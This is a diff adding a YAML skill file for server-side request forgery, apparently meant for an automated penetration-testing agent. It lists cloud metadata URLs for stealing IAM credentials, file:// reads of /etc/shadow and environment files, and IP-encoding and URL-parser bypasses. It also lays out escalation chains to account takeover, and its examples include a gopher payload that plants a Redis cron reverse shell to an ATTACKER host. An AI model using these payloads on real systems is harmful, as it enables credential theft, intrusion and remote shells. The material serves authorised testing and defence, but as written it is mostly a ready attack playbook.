@@ -1,0 +1,176 @@
+name: ssrf
+description: Server-Side Request Forgery detection, exploitation, and cloud metadata pivoting techniques
+techniques:
+  - "Cloud metadata endpoint harvesting"
+  - "Protocol smuggling via gopher/dict/file schemes"
+  - "URL parser differential exploitation"
+  - "DNS rebinding for IP allow-list bypass"
+  - "Blind SSRF via out-of-band channels"
+  - "Internal service interaction and pivoting"
+tools:
+  - httpx
+  - nuclei
+  - browser_navigate
+  - curl
+knowledge: |
+  SSRF lets you turn the server into a proxy. The impact ceiling is cloud account takeover.
+  Every URL the application fetches server-side is a candidate.
+
+  ## Surface Discovery
+  - Any parameter accepting a URL, URI, hostname, or IP: callback URLs, webhook fields, PDF generators,
+    avatar/image fetchers, import-from-URL, link previews, proxy endpoints, file includes.
+  - Content-Type tricks: switch a JSON endpoint to application/xml and embed an external entity that
+    fetches a URL — hybrid XXE+SSRF.
+  - When you see a redirect response from an internal fetch, the app may follow it — chain open redirects.
+
+  ## Cloud Metadata Endpoints
+  AWS IMDSv1 — instant creds if reachable:
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    http://169.254.169.254/latest/user-data
+  AWS IMDSv2 — requires token header; if app forwards custom headers you control, still exploitable:
+    PUT http://169.254.169.254/latest/api/token  (X-aws-ec2-metadata-token-ttl-seconds: 21600)
+    then GET with X-aws-ec2-metadata-token header.
+  GCP:
+    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+    Requires Metadata-Flavor: Google header — test if app copies headers from your request.
+  Azure:
+    http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    Requires Metadata: true header.
+  Kubernetes:
+    /var/run/secrets/kubernetes.io/serviceaccount/token via file:// scheme.
+    https://kubernetes.default.svc/api/v1/namespaces — if service account is privileged.
+  DigitalOcean: http://169.254.169.254/metadata/v1/
+
+  ## Protocol Arsenal
+  http/https — standard; start here.
+  file:// — read local files: file:///etc/passwd, file:///proc/self/environ, file:///etc/shadow.
+    Windows: file:///C:/Windows/win.ini, file:///C:/inetpub/wwwroot/web.config.
+  gopher:// — craft arbitrary TCP streams; send raw Redis, SMTP, or HTTP requests.
+    gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a... (URL-encode each \r\n).
+  dict:// — dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/spool/cron/
+  ftp:// — interact with internal FTP; exfiltrate via passive mode to attacker FTP.
+  ldap:// — query internal LDAP directories; ldap://internal-dc:389/dc=corp,dc=local
+
+  ## URL Bypass Techniques
+  When the app blocks 169.254.169.254 or localhost:
+  IP encoding variants (all resolve to 127.0.0.1):
+    Decimal:     2130706433
+    Hex:         0x7f000001
+    Octal:       0177.0.0.1
+    Mixed:       127.0.0x0.1
+    IPv6:        [::1], [0000::1], [::ffff:127.0.0.1]
+    IPv6 mapped: [::ffff:7f00:1]
+  For 169.254.169.254:
+    Decimal:     2852039166
+    Hex:         0xa9fea9fe
+    Octal:       0251.0376.0251.0376
+  DNS rebinding: register a domain whose A record alternates between your IP and 127.0.0.1.
+    Tools: rbndr.us, rebind.it, or custom DNS server with short TTL.
+  URL parser differentials:
+    http://evil.com@169.254.169.254/ — some parsers treat pre-@ as auth, fetch 169.254.169.254.
+    http://169.254.169.254#@allowed.com — fragment confusion.
+    http://169.254.169.254%2f@allowed.com — path-as-host confusion.
+    http://169.254.169.254\@allowed.com — backslash normalization.
+  Redirect chains: host your URL that 302s to http://169.254.169.254/.
+    If only the initial URL is validated, the redirect bypasses the check.
+  URL shorteners / DNS CNAME to internal IPs.
+
+  ## Internal Service Interaction
+  When SSRF reaches internal services without auth:
+  Redis (6379): SLAVEOF attacker 6379 for data exfil. CONFIG SET dir/dbfilename for file write.
+    Write cron job or SSH key via SET/SAVE.
+  MongoDB (27017): HTTP interface on 28017 in legacy versions — dump collections.
+  Elasticsearch (9200): GET /_cat/indices, GET /index/_search?q=* — full database read.
+  Docker API (2375/2376): GET /containers/json, POST /containers/create with host mounts → RCE.
+  Consul (8500): GET /v1/kv/?recurse — dump all key-value secrets.
+  etcd (2379): GET /v2/keys/?recursive=true — service mesh secrets.
+  Kubernetes API (6443/8443): list pods, exec into containers if RBAC allows.
+  Cloud Functions invoke URL: trigger internal serverless functions with crafted params.
+  Internal admin panels: Jenkins (/script), Grafana, Kibana, Prometheus, Solr — often unauthed internally.
+
+  ## Blind SSRF Detection
+  When you get no response body:
+  Timing-based: compare response times between fast (internal) and slow/timeout (non-routable) hosts.
+    http://127.0.0.1:22 (instant banner) vs http://10.255.255.1 (timeout) → timing delta confirms SSRF.
+  DNS callback: use Burp Collaborator, interact.sh, or dnslog.cn. Inject
+    http://unique-id.your-callback.com and watch for DNS resolution.
+  Error differential: some backends return different error messages for "host unreachable" vs "connection refused"
+    vs "timeout" — map the internal network by observing error patterns.
+  Out-of-band via gopher: send data to your listener even when HTTP response isn't reflected.
+
+  ## Escalation Chains
+  SSRF → cloud metadata → temporary creds → S3/secrets manager/IAM escalation → full account takeover.
+  SSRF → internal admin panel (Jenkins /script) → Groovy console → RCE on build server.
+  SSRF → Redis CONFIG SET + cron → reverse shell on cache server.
+  SSRF → Docker API → privileged container → host escape → infrastructure compromise.
+  SSRF → Kubernetes API → pod exec → lateral movement across cluster.
+  SSRF → internal git server → source code → hardcoded creds → deeper access.
+  Blind SSRF alone is often medium severity; escalate by demonstrating internal port scan or metadata access.
+
+  ## WAF and Filter Evasion
+  When the app or WAF blocks specific patterns:
+    Keyword blocklists on "localhost" or "127.0.0.1":
+      Use alternative representations: 127.1, 127.0.1, 0.0.0.0, [::], spoofed DNS pointing to loopback.
+    Protocol blocklist on "file://":
+      Try gopher://, dict://, or SSRF to an internal service that itself reads files.
+    Port blocklist:
+      Use URL with port in auth section: http://internal:port@allowed.com — parser confusion.
+      Some parsers allow port in password field: http://user:pass:8080@host/
+    IP allowlist (only external IPs allowed):
+      Find an open redirect on an allowed domain → redirect to internal IP.
+      DNS rebinding: TTL=0 record alternating between allowed IP and target.
+    Double-fetch bypass:
+      Some apps validate URL then fetch separately — DNS change between validation and fetch.
+
+  ## Response Processing
+  When you have partial SSRF (can fetch but response is processed):
+    PDF generators: inject HTML with <iframe src="http://internal/"> or <img src="file:///etc/passwd">.
+    Image processors: if response is rendered as image, use timing or error-based techniques.
+    Headless browsers (Puppeteer, Selenium): full browser context — inject JS for complex exfil.
+    XML parsers: SSRF response parsed as XML → chain with XXE if internal endpoint returns XML.
+
+  ## Common Pitfalls
+  - Fetching metadata once isn't enough; also fetch /latest/meta-data/iam/security-credentials/ROLE_NAME.
+  - IMDSv2 doesn't block SSRF — it blocks SSRF that can't set headers. Test header forwarding.
+  - Some WAFs block "169.254" in query strings but not in POST bodies or JSON fields.
+  - PDF generators (wkhtmltopdf, Puppeteer) often follow JS redirects — chain with redirect page.
+  - Image resizers that accept URLs are prime SSRF surfaces; the response is rendered into an image,
+    but blind techniques still work.
+  - GraphQL endpoints with URL-type arguments can hide SSRF surfaces in deep schema fields.
+  - Test both GET and POST-based fetches — some servers only proxy one method.
+  - Partial reads (HTTP range requests) may bypass response size limits on metadata endpoints.
+examples:
+  - title: "AWS IMDSv1 Credential Theft"
+    description: "Retrieve IAM role credentials from EC2 metadata service"
+    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    validation: "Response contains IAM role name; follow up with role-specific URL to get AccessKeyId, SecretAccessKey, Token"
+  - title: "IP Encoding Bypass — Decimal"
+    description: "Bypass naive IP blocklist using decimal notation for 169.254.169.254"
+    payload: "http://2852039166/latest/meta-data/"
+    validation: "Application resolves decimal IP and returns metadata response instead of blocking"
+  - title: "Gopher Protocol Redis RCE"
+    description: "Write a cron reverse shell via Redis using gopher:// protocol"
+    payload: "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0acron%0d%0a$58%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1%0a%0a%0d%0a"
+    validation: "Check for reverse shell callback or verify Redis key was written via a second SSRF read"
+  - title: "DNS Rebinding Bypass"
+    description: "Bypass allow-list that validates hostname at request time but resolves later"
+    payload: "http://A.B.rebind.it/latest/meta-data/ (where A=your-IP, B=169.254.169.254)"
+    validation: "DNS alternates resolution; second resolution hits internal IP after validation passed"
+  - title: "Blind SSRF via DNS Callback"
+    description: "Confirm SSRF existence when no response body is returned"
+    payload: "http://ssrf-test-TOKEN.interact.sh/"
+    validation: "Receive DNS or HTTP callback on out-of-band listener confirming server-side fetch occurred"
+  - title: "File Scheme Local File Read"
+    description: "Read local files via file:// protocol when the fetcher supports it"
+    payload: "file:///etc/passwd"
+    validation: "Response contains /etc/passwd contents or application errors revealing path traversal is possible"
+validation_methods:
+  - "Confirm server-side fetch by receiving out-of-band DNS/HTTP callback on attacker-controlled domain"
+  - "Retrieve known internal resource content (cloud metadata, localhost service banners) and verify in response"
+  - "Measure response time differentials between routable and non-routable internal IPs to confirm blind SSRF"
+  - "Demonstrate credential retrieval from cloud metadata and validate they are active via cloud CLI"
+  - "Map internal network ports by observing distinct error messages for open vs closed vs filtered ports"
+references:
+  - "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"
+  - "https://portswigger.net/web-security/ssrf"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery"
